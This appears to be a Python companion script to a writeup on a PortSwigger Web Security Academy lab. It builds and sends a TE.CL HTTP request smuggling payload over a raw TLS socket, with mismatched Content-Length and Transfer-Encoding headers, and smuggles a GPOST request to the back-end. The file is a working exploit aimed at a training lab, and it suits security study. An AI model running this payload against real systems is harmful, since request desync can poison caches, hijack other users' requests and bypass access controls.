#!/usr/bin/env python3
"""
HTTP request smuggling, basic TE.CL vulnerability
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 15-basic-te-cl.md

What this does:
    Mirror image of the CL.TE lab: the front-end honors Transfer-Encoding
    and forwards every chunk, while the back-end ignores Transfer-Encoding
    and reads exactly Content-Length bytes. Sets Content-Length short
    enough to stop the back-end's read right after the chunk-size line
    (CL = len(chunk_size_hex) + 2, for the hex digits plus their trailing
    CRLF), leaving the actual chunk data -- a complete, self-contained
    GPOST request -- as the start of the next request on the connection.

Usage:
    python 15-basic-te-cl.py <lab-url>
    e.g. python 15-basic-te-cl.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    """Raw TLS socket, ALPN forced to http/1.1 -- there's no 'Update
    Content-Length' checkbox to worry about like in Burp, but the
    equivalent mistake (a library recomputing the header for us) is
    exactly why httpx/requests can't be used for this send."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def send_raw_keep_alive(host: str, payloads: list[bytes], port: int = 443,
                         timeout: float = 10.0, delay: float = 0.5) -> list[bytes]:
    ssl_sock = create_ssl_connection(host, port, timeout)
    responses = []
    try:
        for payload in payloads:
            ssl_sock.sendall(payload)
            time.sleep(delay)
            response = b""
            ssl_sock.settimeout(2.0)
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            responses.append(response)
        return responses
    finally:
        ssl_sock.close()


def build_tecl_payload(host: str, smuggled_request: str, path: str = "/",
                        method: str = "POST") -> bytes:
    """TE.CL payload. Content-Length is set to just cover the chunk-size
    line (hex digits + trailing \\r\\n) -- one byte off in either direction
    either leaves chunk-size digits in the buffer or eats into the
    smuggled request itself. The trailing \\r\\n\\r\\n after the closing 0
    chunk is required or the back-end's chunked parser misbehaves on the
    next request."""
    smuggled_with_term = smuggled_request + "\r\n0\r\n\r\n"
    chunk_size = hex(len(smuggled_request.encode()))[2:]
    chunked_body = f"{chunk_size}\r\n{smuggled_with_term}"
    cl = len(chunk_size) + 2  # back-end reads chunk_size digits + \r\n, nothing more

    headers = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
    )
    return (headers + chunked_body).encode()


def parse_response_status(response: bytes) -> int:
    match = re.search(rb"HTTP/[\d.]+\s+(\d+)", response)
    return int(match.group(1)) if match else 0


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname

    smuggled = (
        "GPOST / HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    attack = build_tecl_payload(host, smuggled)
    normal = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

    for attempt in range(1, 4):
        responses = send_raw_keep_alive(host, [attack, normal])
        status = parse_response_status(responses[-1]) if responses else 0
        print(f"[*] Attempt {attempt}: follow-up response status={status}")
        if status == 403 or (responses and b"Unrecognized method" in responses[-1]):
            print("[+] Back-end processed the smuggled GPOST as its own request -- TE.CL confirmed.")
            break
    else:
        print("[-] Follow-up request came back clean -- desync not confirmed this run.")

    check = httpx.get(lab_url + "/", verify=False)
    if "is-solved" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Lab not yet marked solved -- re-run, the desync can need a couple of tries.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
